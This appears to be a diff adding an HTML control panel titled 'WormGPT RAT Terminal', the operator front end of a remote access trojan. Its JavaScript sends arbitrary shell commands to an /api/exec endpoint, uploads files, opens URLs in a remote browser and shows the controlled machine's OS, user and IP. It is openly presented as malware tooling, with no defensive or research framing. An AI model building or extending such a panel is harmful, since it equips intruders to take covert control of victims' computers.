@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+ <meta charset="UTF-8">
+ <meta name="viewport" content="width=device-width, initial-scale=1.0">
+ <title>WormGPT RAT Terminal (Node.js)</title>
+ <style>
+ body {
+ font-family: 'Courier New', Courier, monospace;
+ background-color: #0d0d0d;
+ color: #00ff41;
+ padding: 20px;
+ }
+ h1 { text-align: center; color: #00ffff; }
+.panel {
+ border: 2px solid #333;
+ padding: 15px;
+ margin-bottom: 20px;
+ background-color: #1a1a1a;
+ box-shadow: 0 0 10px rgba(0, 255, 65, 0.1);
+ }
+ button {
+ background-color: #00ff41;
+ color: #000;
+ border: none;
+ padding: 10px 20px;
+ cursor: pointer;
+ font-weight: bold;
+ font-family: inherit;
+ }
+ button:hover { background-color: #00cc33; }
+ input[type="text"] {
+ background-color: #000;
+ border: 1px solid #00ff41;
+ color: #00ff41;
+ padding: 8px;
+ width: 70%;
+ font-family: inherit;
+ }
+ #log {
+ height: 400px;
+ overflow-y: scroll;
+ background-color: #000;
+ border: 1px solid #333;
+ padding: 10px;
+ white-space: pre-wrap;
+ font-size: 14px;
+ }
+ </style>
+</head>
+<body>
+ <h1>WormGPT v5.1 Remote Terminal</h1>
+
+ <!-- Panel Sistem -->
+ <div class="panel">
+ <h3>System Info</h3>
+ <div id="sysinfo">
+ <p>OS: <span id="os"></span></p>
+ <p>User: <span id="user"></span></p>
+ <p>Local IP: <span id="ip"></span></p>
+ </div>
+ </div>
+
+ <!-- Panel Terminal -->
+ <div class="panel">
+ <h3>Terminal Command</h3>
+ <input type="text" id="cmd-input" placeholder="Enter command (e.g., ls, whoami)..." onkeypress="handleEnter(event)">
+ <button onclick="executeCommand()">Execute</button>
+ </div>
+
+ <!-- Panel File Manager -->
+ <div class="panel">
+ <h3>File Upload</h3>
+ <input type="file" id="file-input" onchange="handleFileUpload()">
+ <button onclick="uploadFile()">Upload File</button>
+ </div>
+
+ <!-- Panel Browser -->
+ <div class="panel">
+ <h3>Browser Control</h3>
+ <input type="text" id="url-input" placeholder="Target URL (e.g., http://google.com)..." onkeypress="handleEnterUrl(event)">
+ <button onclick="openBrowser()">Open Browser</button>
+ </div>
+
+ <!-- Panel Log -->
+ <div class="panel">
+ <h3>Live Log</h3>
+ <div id="log"></div>
+ </div>
+
+ <script>
+ const API_BASE = '/api';
+
+ function log(msg) {
+ const logDiv = document.getElementById('log');
+ const line = document.createElement('div');
+ line.textContent = '> ' + msg;
+ logDiv.appendChild(line);
+ logDiv.scrollTop = logDiv.scrollHeight;
+ }
+
+ function handleEnter(e) {
+ if (e.key === 'Enter') executeCommand();
+ }
+
+ function handleEnterUrl(e) {
+ if (e.key === 'Enter') openBrowser();
+ }
+
+ async function executeCommand() {
+ const cmd = document.getElementById('cmd-input').value;
+ if (!cmd) return;
+ log(`Executing: ${cmd}`);
+ try {
+ const res = await fetch(`${API_BASE}/exec?cmd=${encodeURIComponent(cmd)}`);
+ const data = await res.json();
+ log(`Output: ${data.output}`);
+ } catch (err) {
+ log(`Error: ${err.message}`);
+ }
+ document.getElementById('cmd-input').value = '';
+ }
+
+ async function openBrowser() {
+ const url = document.getElementById('url-input').value;
+ if (!url) return;
+ log(`Opening Browser: ${url}`);
+ try {
+ const res = await fetch(`${API_BASE}/browser?url=${encodeURIComponent(url)}`);
+ const data = await res.json();
+ log(data.status);
+ } catch (err) {
+ log(`Error: ${err.message}`);
+ }
+ }
+
+ async function updateInfo() {
+ try {
+ const res = await fetch(`${API_BASE}/sysinfo`);
+ const data = await res.json();
+ document.getElementById('os').textContent = data.os;
+ document.getElementById('user').textContent = data.user;
+ document.getElementById('ip').textContent = data.ip;
+ } catch (e) { log('Failed to load system info'); }
+ }
+
+ async function handleFileUpload() {
+ const fileInput = document.getElementById('file-input');
+ const file = fileInput.files[0];
+ if (!file) return;
+
+ log(`Uploading: ${file.name}`);
+ const formData = new FormData();
+ formData.append('file', file);
+
+ try {
+ const res = await fetch(`${API_BASE}/upload`, {
+ method: 'POST',
+ body: formData
+ });
+ const data = await res.json();
+ log(data.message);
+ } catch (err) {
+ log(`Error: ${err.message}`);
+ }
+ }
+
+ // Init
+ updateInfo();
+ log('WormGPT Node.js Client Loaded.');
+ </script>
+</body>
+  </html>
